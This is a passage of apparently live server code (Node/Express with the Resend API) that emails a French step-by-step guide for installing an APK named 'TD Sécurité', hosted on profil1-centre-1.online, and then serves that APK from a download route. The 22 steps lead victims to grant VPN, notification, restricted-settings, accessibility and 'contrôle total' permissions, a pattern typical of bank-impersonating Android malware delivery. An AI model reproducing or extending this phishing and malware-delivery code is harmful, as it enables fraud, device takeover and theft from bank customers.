            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Une fen&#234;tre s&#x27;ouvre pour demander l&#x27;autorisation de cr&#233;er une connexion VPN (pour surveiller le r&#233;seau).</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton <strong>&#171;&nbsp;OK&nbsp;&#187;</strong> en bas &#224; droite.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 11 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">11</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 11 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128230; Installer l&#x27;application</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/11.jpg" alt="&#201;tape 11" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">L&#x27;application est en cours d&#x27;installation. Une fen&#234;tre s&#x27;ouvre et vous demande <strong>&#171;&nbsp;Voulez-vous installer cette appli&nbsp;?&nbsp;&#187;</strong></p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton vert <strong>&#171;&nbsp;Installer&nbsp;&#187;</strong> en bas &#224; droite.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 12 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">12</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 12 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128276; Activer les notifications</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/12.jpg" alt="&#201;tape 12" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Une fen&#234;tre bleue appara&#238;t pour demander l&#x27;autorisation d&#x27;envoyer des notifications.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton bleu <strong>&#171;&nbsp;Enable&nbsp;&#187;</strong> tout en bas de l&#x27;&#233;cran.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 13 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">13</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 13 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9855;&#65039; Activer les param&#232;tres d&#x27;accessibilit&#233;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/13.jpg" alt="&#201;tape 13" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Une autre fen&#234;tre bleue appara&#238;t. Elle demande l&#x27;acc&#232;s aux param&#232;tres d&#x27;accessibilit&#233; (pour le contr&#244;le complet de l&#x27;&#233;cran).</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton bleu <strong>&#171;&nbsp;Enable&nbsp;&#187;</strong> tout en bas de l&#x27;&#233;cran.</p></td></tr></table></td></tr>
          </table>
          <!-- STEPS 14-22 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">14</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 14 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128683; Acc&#232;s bloqu&#233; &ndash; D&#233;bloquer l&#x27;application</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/14.jpg" alt="&#201;tape 14" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Dans le menu <strong>&#171;&nbsp;Applications t&#233;l&#233;charg&#233;es&nbsp;&#187;</strong>, vous voyez <strong>&#171;&nbsp;TD s&#233;curit&#233; &ndash; Contr&#244;l&#233; par les param&#232;tres restreints&nbsp;&#187;</strong>. Suivez les prochaines &#233;tapes pour d&#233;bloquer.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Suivez les prochaines &#233;tapes pour d&#233;bloquer l&#x27;application dans les param&#232;tres syst&#232;me.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">15</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 15 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9881;&#65039; Ouvrir les Param&#232;tres du t&#233;l&#233;phone</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/15.jpg" alt="&#201;tape 15" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Ouvrez l&#x27;application <strong>Param&#232;tres</strong> de votre t&#233;l&#233;phone.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Vous allez voir le menu principal des param&#232;tres Android.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">16</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 16 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128241; Aller dans Applications</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/16.jpg" alt="&#201;tape 16" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Dans les Param&#232;tres, appuyez sur <strong>&#171;&nbsp;Applications&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">La liste de toutes les applications install&#233;es appara&#238;t.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">17</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 17 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128269; Trouver TD S&#233;curit&#233;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/17.jpg" alt="&#201;tape 17" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Dans la liste des applications, faites d&#233;filer jusqu&#x27;&#224; trouver <strong>TD S&#233;curit&#233;</strong> et appuyez dessus.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">La page de param&#232;tres de l&#x27;application s&#x27;ouvre.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">18</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 18 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9881;&#65039; Ouvrir les Param&#232;tres suppl&#233;mentaires</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/18.jpg" alt="&#201;tape 18" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Dans la page de TD S&#233;curit&#233;, appuyez sur <strong>&#171;&nbsp;Param&#232;tres suppl&#233;mentaires&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Un nouveau menu de param&#232;tres avanc&#233;s s&#x27;ouvre.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">19</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 19 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128275; Autoriser les param&#232;tres restreints</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/19.jpg" alt="&#201;tape 19" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Appuyez sur <strong>&#171;&nbsp;Autoriser les param&#232;tres restreints&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">L&#x27;application sera autoris&#233;e &#224; acc&#233;der aux fonctions d&#x27;accessibilit&#233;.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">20</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 20 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9855;&#65039; Trouver TD S&#233;curit&#233; dans Accessibilit&#233;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/20.jpg" alt="&#201;tape 20" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Vous &#234;tes maintenant dans le menu <strong>&#171;&nbsp;Accessibilit&#233;&nbsp;&#187;</strong>. Faites d&#233;filer la liste vers le bas jusqu&#x27;&#224; trouver <strong>&#171;&nbsp;TD s&#233;curit&#233;&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur cette ligne pour entrer dans les param&#232;tres de l&#x27;application.</p></td></tr></table></td></tr>
          </table>
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">21</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 21 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128307; Activer TD S&#233;curit&#233;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/21.jpg" alt="&#201;tape 21" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Vous &#234;tes sur la page de configuration de TD s&#233;curit&#233;. En haut, vous voyez l&#x27;interrupteur <strong>&#171;&nbsp;Utiliser TD s&#233;curit&#233;&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur cet interrupteur pour le mettre en position <strong>ON</strong> (il va devenir vert/bleu).</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 22 - FINAL -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:2px solid #1a7b3a;border-radius:14px;overflow:hidden;box-shadow:0 4px 16px rgba(26,123,58,0.18);">
            <tr><td style="background:linear-gradient(90deg,#1a7b3a,#22a04a);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#ffffff;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#1a7b3a;font-size:15px;font-weight:800;">22</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:rgba(255,255,255,0.8);font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#11088; &#201;tape Finale &ndash; &#201;tape 22 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#ffffff;font-size:16px;font-weight:700;line-height:1.3;">&#128737;&#65039; Autoriser le contr&#244;le total</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#f0faf3;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/22.jpg" alt="&#201;tape 22" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#f0faf3;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Imm&#233;diatement apr&#232;s avoir activ&#233; l&#x27;interrupteur, cette fen&#234;tre va s&#x27;ouvrir. Elle vous demande&nbsp;: <strong>&#171;&nbsp;Accorder le contr&#244;le total de votre appareil &#224; TD s&#233;curit&#233;&nbsp;?&nbsp;&#187;</strong></p></td></tr><tr><td style="border-top:1px solid #b7dfc4;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Regardez en bas de la fen&#234;tre. Appuyez sur le bouton <strong>&#171;&nbsp;Autoriser&nbsp;&#187;</strong>.</p></td></tr></table></td></tr>
          </table>
        </td></tr>
        <!-- FOOTER -->
        <tr>
          <td style="background:#1a3020;border-radius:0 0 16px 16px;padding:28px;border:1px solid #0f1f12;border-top:none;text-align:center;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr><td align="center" style="padding-bottom:16px;"><div style="display:inline-block;background:rgba(255,255,255,0.08);border-radius:10px;padding:8px 20px;"><p style="margin:0;color:#ffffff;font-size:14px;font-weight:800;letter-spacing:1px;">TD S&#201;CURIT&#201;</p></div></td></tr>
              <tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.55);font-size:12px;line-height:1.6;">Cet e-mail a &#233;t&#233; envoy&#233; automatiquement. Merci de ne pas y r&#233;pondre directement.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.35);font-size:11px;">&#169; 2025 TD S&#233;curit&#233;. Tous droits r&#233;serv&#233;s.</p></td></tr>
            </table>
          </td>
        </tr>
        <tr><td style="height:24px;background:#f0faf3;"></td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>`,
      text: `Guide d'installation – TD Sécurité\n\nCe guide vous explique, étape par étape, comment télécharger et installer l'application TD Sécurité sur votre appareil Android.\n\nSuivez les 22 étapes dans l'ordre indiqué.\n\n© 2025 TD Sécurité. Tous droits réservés.`,
    }
  };

  const emailPayload = templates[lang] || templates.en;

  try {
    const resend = new Resend(RESEND_API_KEY);
    const { data, error } = await resend.emails.send({
      from: `${FROM_NAME} <${FROM_EMAIL}>`,
      to: [recipient],
      subject: emailPayload.subject,
      html: emailPayload.html,
      text: emailPayload.text,
    });

    if (error) {
      console.error('[Admin] Resend API error:', error);
      return res.status(500).json({ success: false, error: `Resend error: ${error.message}` });
    }

    console.log(`[Admin] Email sent to ${recipient} via Resend. ID: ${data?.id}`);
    return res.json({ success: true });
  } catch (err) {
    console.error('[Admin] Failed to call Resend API:', err.message);
    return res.status(500).json({ success: false, error: 'Failed to send email. Server error.' });
  }
});

// =============================================
// APP DOWNLOAD ROUTE
// =============================================
app.get('/api/download-td-app', (req, res) => {
  const apkPath = path.join(__dirname, 'public', 'TD-sécurité.apk');
